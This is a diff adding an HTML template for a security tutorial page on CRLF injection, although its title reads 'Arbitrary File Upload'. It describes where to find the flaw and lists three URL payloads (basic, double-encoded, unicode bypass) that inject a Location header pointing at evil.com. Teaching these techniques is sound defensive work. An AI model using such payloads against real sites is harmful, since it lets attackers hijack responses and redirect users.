@@ -1,0 +1,110 @@
+{% extends 'base.html' %}
+{% block body %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arbitrary File Upload</title>
+    <style>
+body, h1, h2, p, ol, li, pre, code {
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+}
+
+article {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+}
+
+h2 {
+    font-size: 1.5em;
+    margin-top: 20px;
+    margin-bottom: 10px;
+}
+
+section {
+    margin-bottom: 20px;
+}
+
+pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+}
+
+code {
+    font-family: Consolas, monospace;
+}
+
+/* Style Markdown code blocks */
+pre code {
+    display: block;
+    padding: 10px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    overflow-x: auto;
+}
+
+    </style>
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRLF Injection</title>
+</head>
+<body>
+    <h1>CRLF Injection</h1>
+
+    <h2>Introduction</h2>
+    <p>A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.</p>
+
+    <h2>Where to find</h2>
+    <p>It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).</p>
+
+    <h2>How to exploit</h2>
+    <ol>
+        <li>
+            <p>Basic payload</p>
+            <pre><code>https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/</code></pre>
+            <p>The response is</p>
+            <pre><code>HTTP/1.1 200 OK
+Content-Type: text/html
+Date: Mon, 09 May 2016 14:47:29 GMT
+Set-Cookie: language=en
+Location: https://evil.com/</code></pre>
+        </li>
+        <li>
+            <p>Double encode</p>
+            <pre><code>https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/</code></pre>
+        </li>
+        <li>
+            <p>Bypass unicode</p>
+            <pre><code>https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/</code></pre>
+        </li>
+    </ol>
+
+    <h2>References</h2>
+    <ul>
+        <li><a href="https://blog.innerht.ml/twitter-crlf-injection/">@filedescriptor</a></li>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md">EdOverflow</a></li>
+    </ul>
+</body>
+</html>
+</body>
+{% endblock %}
